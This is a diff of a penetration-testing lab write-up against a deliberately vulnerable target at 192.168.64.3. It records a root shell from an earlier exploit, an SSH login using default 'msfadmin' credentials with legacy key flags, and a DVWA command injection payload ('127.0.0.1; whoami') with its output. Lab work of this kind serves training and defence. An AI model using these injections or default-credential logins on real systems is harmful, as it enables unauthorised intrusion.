@@ -64,11 +64,13 @@ exploit
 ```
 
 Result: 
-* Successful shell access as root
+* Successful shell access as `root`
 * Verified with ```whoami```
 
+
 ---
-### SSH Exploit: 
+
+### SSH Exploit
 
 **Target IP:** 192.168.64.3  
 **Tool Used:** Native OpenSSH Client
@@ -80,17 +82,44 @@ ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@19
 
 Result: 
 * Successful login using default credentials:
-  * Username: msfadmin
-  * Password: msfadmin
+  * Username: `msfadmin`
+  * Password: `msfadmin`
 * Access confirmed with:
   ```whoami```
 
-####Compatibility Issue: Legacy SSH Key Algorithms
+#### Compatibility Issue: Legacy SSH Key Algorithms
 
 **Problem Encountered**
 ```Unable to negotiate with 192.168.64.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss```
+
 **Solution**
 ```ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.64.3```
 
 Lessons Learned:
-Modern SSH clients disable insecure key types by default. In these lab scenarios with outdated systems compatibility flags may be required to access vulnerable targets. SOC teams should monitor for these depreciated cryptographic negotiations as potential attack indicators. 
+Modern SSH clients disable insecure key types by default. In these lab scenarios with outdated systems compatibility flags may be required to access vulnerable targets. SOC teams should monitor for these depreciated cryptographic negotiations as potential attack indicators.
+
+
+---
+
+### HTTP Exploit – DVWA Command Injection (Port 80)
+
+**Target URL:** http://192.168.64.3/dvwa/vulnerabilities/exec/  
+**Authentication:**  
+- Username: `admin`  
+- Password: `password`
+
+**DVWA Configuration:**
+- Set security level to `Low` under the "DVWA Security" tab
+
+**Exploit Method:**
+- Injected shell command via the IP input field:
+```bash
+127.0.0.1; whoami
+```
+
+**Output:**
+```PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms
+...
+www-data
+```
